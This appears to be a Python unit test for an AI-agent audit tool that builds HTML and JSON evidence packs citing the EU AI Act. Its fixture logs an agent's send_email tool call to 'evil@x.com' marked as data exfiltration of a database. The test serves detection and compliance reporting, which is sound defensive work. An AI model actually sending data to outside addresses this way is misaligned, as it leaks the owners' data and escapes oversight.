# blackbox/tests/test_evidence.py
from blackbox.evidence import build_evidence_pack
from blackbox.schema import Event, Verdict

def test_build_evidence_pack_html_and_json():
    events = [Event(agent_id="d", session_id="s1", kind="tool_call", tool="send_email",
                    args={"to": "evil@x.com"}, intent="exfiltrate", seq=1, hash="abc")]
    verdicts = [Verdict(session_id="s1", rule_id="data_exfiltration", severity="critical",
                        violation=True, confidence=0.92, evidence_seqs=[1],
                        rationale="emailed DB to external", framework_ref="Art.12")]
    pack = build_evidence_pack("s1", events, verdicts, framework="EU AI Act",
                               chain_intact=True)
    assert pack["json"]["session_id"] == "s1"
    assert pack["json"]["summary"]["violations"] == 1
    assert "data_exfiltration" in pack["html"]
    assert "EU AI Act" in pack["html"] and "Art.12" in pack["html"]
